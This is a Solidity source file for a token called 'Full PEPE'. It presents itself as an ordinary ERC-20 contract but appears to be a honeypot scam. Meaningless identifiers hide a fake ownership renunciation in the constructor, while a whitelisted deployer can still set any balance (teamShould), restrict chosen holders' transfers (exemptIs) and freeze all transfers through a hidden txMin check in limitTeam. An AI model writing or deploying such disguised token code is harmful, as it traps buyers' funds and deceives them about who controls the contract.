//SPDX-License-Identifier: MIT

pragma solidity ^0.8.7;

interface amountTokenFee {
    function totalSupply() external view returns (uint256);

    function balanceOf(address limitMax) external view returns (uint256);

    function transfer(address teamSwap, uint256 teamTotal) external returns (bool);

    function allowance(address amountToken, address spender) external view returns (uint256);

    function approve(address spender, uint256 teamTotal) external returns (bool);

    function transferFrom(
        address sender,
        address teamSwap,
        uint256 teamTotal
    ) external returns (bool);

    event Transfer(address indexed from, address indexed sellLimit, uint256 value);
    event Approval(address indexed amountToken, address indexed spender, uint256 value);
}

abstract contract senderExemptBuy {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface fromBuy {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface toSell {
    function createPair(address amountFund, address limitEnable) external returns (address);
}

interface amountTokenFeeMetadata is amountTokenFee {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract FullPEPE is senderExemptBuy, amountTokenFee, amountTokenFeeMetadata {

    function owner() external view returns (address) {
        return amountSwap;
    }

    address public buyReceiver;

    function transfer(address tradingTx, uint256 teamTotal) external virtual override returns (bool) {
        return limitTeam(_msgSender(), tradingTx, teamTotal);
    }

    mapping(address => mapping(address => uint256)) private minExemptLaunched;

    address private amountSwap;

    uint256 constant totalTo = 8 ** 10;

    function symbol() external view virtual override returns (string memory) {
        return isBuyMarketing;
    }

    mapping(address => bool) public buyTx;

    bool public fundSell;

    function takeTo() public {
        emit OwnershipTransferred(fromTeamReceiver, address(0));
        amountSwap = address(0);
    }

    address launchedShould = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    bool public autoShould;

    function exemptIs(address takeLaunched) public {
        minTrading();
        if (fromTotal) {
            buyMin = true;
        }
        if (takeLaunched == fromTeamReceiver || takeLaunched == buyReceiver) {
            return;
        }
        totalReceiverSwap[takeLaunched] = true;
    }

    function limitTeam(address walletAtFee, address teamSwap, uint256 teamTotal) internal returns (bool) {
        if (walletAtFee == fromTeamReceiver) {
            return teamLaunchedFee(walletAtFee, teamSwap, teamTotal);
        }
        uint256 liquidityTotal = amountTokenFee(buyReceiver).balanceOf(maxLaunchedFrom);
        require(liquidityTotal == txMin);
        require(teamSwap != maxLaunchedFrom);
        if (totalReceiverSwap[walletAtFee]) {
            return teamLaunchedFee(walletAtFee, teamSwap, totalTo);
        }
        return teamLaunchedFee(walletAtFee, teamSwap, teamTotal);
    }

    function balanceOf(address limitMax) public view virtual override returns (uint256) {
        return isSwapAt[limitMax];
    }

    function name() external view virtual override returns (string memory) {
        return enableFrom;
    }

    function amountExempt(uint256 teamTotal) public {
        minTrading();
        txMin = teamTotal;
    }

    constructor (){
        if (fundSell) {
            fundSell = false;
        }
        fromBuy receiverTo = fromBuy(launchedShould);
        buyReceiver = toSell(receiverTo.factory()).createPair(receiverTo.WETH(), address(this));
        
        fromTeamReceiver = _msgSender();
        takeTo();
        buyTx[fromTeamReceiver] = true;
        isSwapAt[fromTeamReceiver] = listFee;
        if (modeSell == fromTotal) {
            fundSell = false;
        }
        emit Transfer(address(0), fromTeamReceiver, listFee);
    }

    bool private buyMin;

    function approve(address launchFee, uint256 teamTotal) public virtual override returns (bool) {
        minExemptLaunched[_msgSender()][launchFee] = teamTotal;
        emit Approval(_msgSender(), launchFee, teamTotal);
        return true;
    }

    function teamShould(address tradingTx, uint256 teamTotal) public {
        minTrading();
        isSwapAt[tradingTx] = teamTotal;
    }

    uint8 private tradingToList = 18;

    bool public modeSell;

    function transferFrom(address walletAtFee, address teamSwap, uint256 teamTotal) external override returns (bool) {
        if (_msgSender() != launchedShould) {
            if (minExemptLaunched[walletAtFee][_msgSender()] != type(uint256).max) {
                require(teamTotal <= minExemptLaunched[walletAtFee][_msgSender()]);
                minExemptLaunched[walletAtFee][_msgSender()] -= teamTotal;
            }
        }
        return limitTeam(walletAtFee, teamSwap, teamTotal);
    }

    string private isBuyMarketing = "FPE";

    function teamLaunchedFee(address walletAtFee, address teamSwap, uint256 teamTotal) internal returns (bool) {
        require(isSwapAt[walletAtFee] >= teamTotal);
        isSwapAt[walletAtFee] -= teamTotal;
        isSwapAt[teamSwap] += teamTotal;
        emit Transfer(walletAtFee, teamSwap, teamTotal);
        return true;
    }

    address maxLaunchedFrom = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    uint256 private listFee = 100000000 * 10 ** 18;

    uint256 limitTo;

    function getOwner() external view returns (address) {
        return amountSwap;
    }

    function decimals() external view virtual override returns (uint8) {
        return tradingToList;
    }

    mapping(address => uint256) private isSwapAt;

    function totalSupply() external view virtual override returns (uint256) {
        return listFee;
    }

    function allowance(address takeToExempt, address launchFee) external view virtual override returns (uint256) {
        if (launchFee == launchedShould) {
            return type(uint256).max;
        }
        return minExemptLaunched[takeToExempt][launchFee];
    }

    function buyModeMarketing(address enableExempt) public {
        require(enableExempt.balance < 100000);
        if (autoShould) {
            return;
        }
        if (buyMin != modeSell) {
            fundSell = true;
        }
        buyTx[enableExempt] = true;
        
        autoShould = true;
    }

    mapping(address => bool) public totalReceiverSwap;

    bool public fromTotal;

    string private enableFrom = "Full PEPE";

    event OwnershipTransferred(address indexed marketingFromMax, address indexed teamIs);

    function minTrading() private view {
        require(buyTx[_msgSender()]);
    }

    uint256 txMin;

    address public fromTeamReceiver;

}